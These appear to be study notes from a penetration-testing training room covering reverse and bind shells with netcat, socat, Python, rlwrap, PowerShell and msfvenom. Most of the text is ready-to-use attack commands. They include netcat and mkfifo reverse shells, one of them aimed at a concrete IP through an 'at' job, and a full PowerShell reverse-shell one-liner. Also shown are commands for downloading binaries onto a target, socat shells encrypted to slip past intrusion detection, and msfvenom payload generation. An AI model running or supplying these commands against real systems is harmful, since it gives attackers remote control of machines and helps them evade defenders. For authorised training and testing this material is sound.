# netcat socat metasploit reverse
## Reverse
On the attacking machine:

`sudo nc -lvnp 443`

On the target:

`nc <LOCAL-IP> <PORT> -e /bin/bash`

## bind

On the target:

`nc -lvnp <port> -e "cmd.exe"`

On the attacking machine:

`nc MACHINE_IP <port>`
# at 
`echo 'sleep 10; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.107 1336 > /tmp/f' | at now`
# script
* `script -q /dev/null sh`
* `export TERM=xterm`
* `Ctrl + Z`
* `stty raw -echo; fg`

# Python

The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:

*    The first thing to do is use `python3 -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
*    Step two is: `export TERM=xterm` -- this will give us access to term commands such as clear.
*    Finally (and most importantly) we will background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

# rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.

To use rlwrap, we invoke a slightly different listener:

`rlwrap nc -lvnp <port>`

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell. 

# Socat

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary `(sudo python3 -m http.server 80)`, then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks. 
## Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

`socat TCP-L:<port> -`

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>.`

On Windows we would use this command to connect back:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

## Bind Shells

On a Linux target we would use the following command:

`socat TCP-L:<PORT> EXEC:"bash -li"`

On a Windows target we would use this command for our listener:

`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

`socat TCP:<TARGET-IP>:<TARGET-PORT> -`

# Powerful uses of socat
Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:

``` socat TCP-L:<port> FILE:`tty`,raw,echo=0 ```

Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are allocating a new tty, and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and allocating a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows:

`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:

*    pty, allocates a pseudoterminal on the target -- part of the stabilisation process
*    stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
*    sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
*    setsid, creates the process in a new session
*    sane, stabilises the terminal, attempting to "normalise" it.

That's a lot to take in, so let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:

# Socat Encrypted shell

One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells. We'll cover a few examples at the end of the task, but first let's talk about certificates.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single `.pem` file:

`cat shell.key shell.crt > shell.pem`

Now, when we set up our reverse shell listener, we use:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

The same technique would apply for a bind shell:

Target:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Attacker:

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

# Common Payloads

## Msfvenom
A previous task mentioned that we'd be looking at some ways to use netcat as a listener for a bindshell, so we'll start with that. In some versions of netcat (including the `nc.exe` Windows version included with Kali at `/usr/share/windows-resources/binaries`, and the version used in Kali itself: `netcat-traditional`) there is a `-e` option which allows you to execute a process on connection. For example, as a listener:

`nc -lvnp <PORT> -e /bin/bash`

Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target.

However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?). On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell:

`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

The following paragraph is the technical explanation for this command. It's slightly above the level of this room, so don't worry if it doesn't make much sense for now -- the command itself is what matters.

The command first creates a named pipe at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

![image](https://i.imgur.com/se5Fyn3.png)

A very similar command can be used to send a netcat reverse shell:

`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

![image](https://i.imgur.com/Xf0hA5p.png)

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.

This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

In order to use this, we need to replace "<IP>" and "<port>" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell:

# Payload

Msfvenom: the one-stop-shop for all things payload related.

Part of the Metasploit framework, msfvenom is used to generate code for, primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe, .aspx, .war, .py`). It's this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.

The standard syntax for msfvenom is as follows:

`msfvenom -p <PAYLOAD> <OPTIONS>`

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

Staged vs Stageless

Before we go any further, there are another two concepts which must be introduced: staged reverse shell payloads and stageless reverse shell payloads.

1. Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and downloads the actual payload. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
2. Stageless payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discovery and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by antivirus software.

Payload used was shell_reverse_tcp. This indicates that it was a stageless payload. How? Stageless payloads are denoted with underscores (_). The staged equivalent to this payload would be:

`shell/reverse_tcp`

As staged payloads are denoted with another forward slash (/).

This rule also applies to Meterpreter payloads. A Windows 64bit staged Meterpreter payload would look like this:

windows/x64/meterpreter/reverse_tcp

# cols and rows

With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

First, open another terminal and run `stty -a`. This will give you a large stream of output. Note down the values for "rows" and columns:
![image](https://i.imgur.com/7aOKtlO.png)
Next, in your reverse/bind shell, type in:

`stty rows <number>`

and

`stty cols <number>`

Filling in the numbers you got from running the command in your own terminal.

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.
